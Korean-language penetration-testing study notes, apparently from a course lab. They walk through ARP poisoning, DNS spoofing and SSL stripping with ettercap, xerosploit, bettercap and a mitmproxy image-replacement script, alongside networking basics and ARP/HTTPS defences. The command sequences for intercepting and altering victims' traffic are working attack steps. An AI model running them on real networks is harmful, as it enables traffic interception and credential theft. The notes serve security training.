@@ -1,0 +1,297 @@
+
+macof(위조된 MAC을 지속적으로 발생시켜 스위치의 ARP 테이블을 flood 시킨다.)
+
+- 장비 장애 보안 정책
+1) Fail Safe(장애 안전) : 장애 발생 시 모든 기능을 허용하는 정책(가용성 우선, 스위치)
+2) Fail Security(장애 보안) : 장애 발생 시 모든 기능을 차단하는 정책(보안성 우선)
+
+- 윈도우에서 맥 주소 소정
+netsh -c "interface ipv4" set neighbors "로컬 영역 연결(이름확인)" "GW IP" "GW MAC"
+1. 라우팅(routing)는 데이터를 어떤 경로로 보낼지 결정하는 것이다. (정보가 등록되는 라우팅 테이블)
+2. 네트워크를 분할하는것을 서브넷팅(subneting), 분할된 네트워크를 서브넷(subnet)이라 한다.
+3. 192.168.0.0/24에서 네트워크 ID는 192.168.0이고 호스트 ID는 0이다. 기존 192.168.0.0/24를서브넷팅되면 네트워크 ID, 서브넷 ID, 호스트 ID로 나눌 수 있다,  (24는 CIDR(FREFIX)표기법 이다.)
+4. 라우터간에 라우팅 정보를 서로 교환하기 위한 프로토콜을 라우팅 프로토콜이라 한다.
+
+arp spoofing : 
+arp poisoning : ARP 테이블을 조작해 트래픽을 가로채거나 위조하는 네트워크 공격 방식
+arp redirect
+
+
+GARP
+
+MITM 중간자 공격
+
+
+
+
+
+- 도청, 스니핑, DoS : 수동적 공격(Passive Attack)
+  - Denial of Service
+- 중간에서 변조 : Active Attack (능동적, 적극적인, 공격)
+
+
+10.0.0.134  00:0c:29:63:43:7c
+10.0.0.143   00:0c:29:cd:76:c3
+10.0.0.142  00:0c:29:a9:d6:f5
+10.0.0.222   12:74:c2:9d:a8:37
+
+
+
+root@kali:/home/kali# arp -a
+? (10.0.0.2) at 00:50:56:c0:00:08 [ether] on eth0
+? (10.0.0.143) at 00:0c:29:cd:76:c3 [ether] on eth0
+? (10.0.0.254) at 00:50:56:e5:a9:df [ether] on eth0
+? (10.0.0.200) at 00:0c:29:89:52:20 [ether] on eth0
+? (10.0.0.1) at 00:50:56:ee:c3:63 [ether] on eth0
+? (10.0.0.222) at 12:74:c2:9d:a8:37 [ether] on eth0
+? (10.0.0.142) at 00:0c:29:a9:d6:f5 [ether] on eth0
+
+
+roror@roror-virtual-machine:~$ sudo -s
+[sudo] roror 암호:        
+root@roror-virtual-machine:/home/roror# arp -a
+_gateway (10.0.0.1) 과 00:0c:29:63:43:7c [ether] ens33 에서
+? (10.0.0.254) 과 00:50:56:e5:a9:df [ether] ens33 에서
+? (10.0.0.134) 과 00:0c:29:63:43:7c [ether] ens33 에서
+? (10.0.0.2) 과 00:50:56:c0:00:08 [ether] ens33 에서
+
+
+
+ARP reply  --->   Kali ---> Sender(자신) ---  상대방(IP,MAC)
+kali : 10.0.0.130(1번경) 00:0c:29:13:f0:ef
+Mint : 10.0.0.139  00:0c:29:ce:84:14
+
+
+GET/POST : Method (Client  요청자)
+GET : Data ---> header
+POST : Data ---> body
+
+
+
+root@kali:/home/kali# nmap -sn 10.0.0.0/24
+
+
+
+# apt install ruby-dev libpcap-dev libgmp3-dev -y
+# apt install ruby-pg libpq5 libpq-dev
+# apt install python3-pip python3-virtualenv virtualenv
+# pip install terminaltable tabulate Pillow (참고)
+# gem install sorted_set
+# apt update && apt upgrade (업데이트가 안될경우 패키지 다운이 안된다.)
+# git clone https://github.com/LionSec/xerosploit.git
+# cd xerosploit && python install.py  (1번설치, 패키지 문제로 시간이 오래걸림)
+
+----- ettercap
+가. 메뉴
+1) hosts
+- IPv6 스캔 : 메뉴 -> 호스트(IPv6 Scan 체크)
+- scan for hosts (호스트 스캔)
+- hosts list
+- Add to Target 1 (라우터)
+- Add to Target 2 (공격 대상자)
+
+2. ARP Poisoning...
+- MITM menu -> ARP Poisoning
+- Wireshark를 이용하여 패킷 캡처 (http.request.method contains "POST")
+
+
+3. DNS spoofing
+- vi /etc/ettercap
+*.kb.or.kr A 192.168.0.7(DNS spoofing 서버)
+- 대상 PC Add to Target 1 에 설정
+- 메뉴 -> Plugins -> dns_spoof 선택 우클릭 활성화
+- MITM 메뉴 -> ARP poi.... 공격
+- ipconfig /flushdns (대상PC) 이후 사이트 접속
+
+4. 
+- vi /etc/ettercap
+ec_uid = 65534 # nobody is the default
+ec_gid = 65534 # nobody is the default
+주석해제 
+redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
+redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
+# pendant for IPv6 - Note that you need iptables v1.4.16 or newer to use IPv6 redirect
+redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
+redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
+
+# ettercap-pkexec -G 
+-  1. Add to Target 1에 Gateway 설정,  Add to Target 2에 대상PC 설정
+- 메뉴 -> Plugins -> Manage plugins -> sslstrip 선택 우클릭 활성화
+Activating sslstrip plugin...
+SSLStrip plugin: bind 80 on 59273
+SSLStrip Plugin version 1.2 is still under experimental mode. Please reports any issues to the development team.
+- MITM 메뉴 -> ARP poi.... [ Only poison one-way ] 만 체크
+  ✎Sniff remote connections: 양방향속
+  ✎Only poison one-way: 단방향속
+     ▲스니핑은 단방향속 선택
+- MITM 메뉴 SSL Intercept 확인 및 대상 컴퓨터에서 https 접속, http로 이동시킨다.
+
+
+-----
+- 공격방법 : 모의해킹 -> 보조학습 자료 -> xerosploit 파일 참고
+help -> scan
+192.168.10.131 공격대상 IP 입력후 엔터
+hlep 로 공격 명령 참고
+pscan -> run
+back (뒤로)
+replace -> run -> 이미지 삽입후 엔터(공격)
+
+sniff 로그저장
+/opt/xerosploit/xerosniff
+
+dspoof
+[+] Enter the IP address where you want to redirect the traffic. 
+모든 대상 탐색 호스트에 잘못된 DNS 정보를 제공하는 dspoof 모듈을 로드
+칼리 IP지정, 아파치 설정
+
+htmlinjection
+index.html 만들고 공격 : run -> 파일지정
+취약한 사이트 접속
+
+-------------------------------------------
+1. 설치
+# apt update
+# apt install bettercap mitmproxy python3-pip
+# bettercap -iface eth0       // Bettercap 콘솔 실행
+
+2. Bettercap 콘솔 명령어
+net.probe on
+net.show
+set arp.spoof.targets <Victim_IP>
+arp.spoof on
+net.sniff on
+- 이제 피해자 트래픽이 공격자(Kali)로 경유됨.
+
+3. 인증서 생성 → 한 번 실행하면 ~/.mitmproxy/ 폴더에 인증서(mitmproxy-ca-cert.pem) 자동 생성
+# mitmproxy 
+
+4. 이미지 교체 스크립트 작성
+# vi image_replace.py
+from mitmproxy import http
+
+def response(flow: http.HTTPFlow):
+    # 이미지 요청만 변조
+    if flow.response and "image" in flow.response.headers.get("content-type", ""):
+        with open("/root/new_image.jpg", "rb") as f:
+            flow.response.content = f.read()
+
+5. mitmproxy 실행 (포트 8080)
+# mitmproxy -p 8080 -s image_replace.py
+
+6. Bettercap에서 트래픽을 mitmproxy로 넘기기
+ (Bettercap 콘솔 내에서 실행)
+set net.sniff.local true
+set http.proxy.address 127.0.0.1
+set http.proxy.port 8080
+
+7. 또는 iptables로 직접 리디렉션:
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+
+
+
+172.16.0.0/24 > 172.16.0.133  » set dns.spoof.domains roror.co.kr                                        
+172.16.0.0/24 > 172.16.0.133  » set dns.spoof.address 10.0.0.130
+172.16.0.0/24 > 172.16.0.133  » dns.spoof on
+
+
+netsh -c "interface ipv4" set neighbors "이더넷 2" "172.16.0.1" "58-86-94-36-51-4b"
+
+
+
+
+bettercap -iface eth0
+
+net.probe on
+net.show
+
+net.probe on
+net.show
+set arp.spoof.targets <피해자_IP>
+set arp.spoof.fullduplex true
+arp.spoof on
+set net.sniff.verbose true
+
+set dns.spoof.domains naver.com
+set dns.spoof.address <공격자IP(서버)>
+dns.spoof on
+
+http://naver.com
+
+
+HTTPS에서 차단이 발생하는 이유
+인증서 검증	서버가 제시한 인증서의 도메인이 daum.net 과 다르면 “신뢰할 수 없음” 경고
+TLS 암호화	패킷 내용이 완전히 암호화되어 중간에서 수정 불가
+HSTS (Strict-Transport-Security)	HTTP로 다운그레이드 시도 자체를 차단
+SNI 검사	TLS 시작 단계에서 서버 이름 불일치 감지
+
+이 네 가지가 동시에 작동하기 때문에
+DNS 스푸핑만으로는 더 이상 사용자를 속이거나 페이지 내용을 바꾸는 게 불가능합니다.
+
+
+
+
+
+
+? (10.0.0.1) at 00:50:56:ee:c3:63 [ether] on eth0
+
+sudo arp -s 10.0.0.1 00:50:56:ee:c3:63
+
+
+
+컴퓨터\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\SshHostKeys
+
+
+
+root@roror:/usr/share/crypto-policies# ls -l /bin/false 
+-rwxr-xr-x. 1 root root 36472 2024년 11월 26일 /bin/false
+root@roror:/usr/share/crypto-policies# vi /etc/shells
+  8 /bin/false
+
+
+
+
+
+
+
+
+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoXvstIA6hEMwZm95CqKwj6ie0novuh2F4RUJBKNwpHiSVhiaNVXUd0zBjnZazdwB6W/f+ONJEE96nKkeFdQIixu5xpuTN1NJDJo4yA2qzhdnnlScHdOPMBbjLnnrVU6eMQW44LwoadCTsU7XYtbDPSMD3LVs32u5PmErmUklxpNu4PDiTzoaiM0pmXkW/OAKykXmOsvo5LPYFpEQQhIlq0o+xMXKzXDkLZaF0elOgmz7dfZpDaYoIdHbE59dB4qTHznWzMvMpVxJ959A/ZUg3hADcazTdgVRZDFzcICXOarfo0NMjcKmKB7C8TxEOcco2WcW32LC4wKdBhY6MrAo/ fix1004@naver.com
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
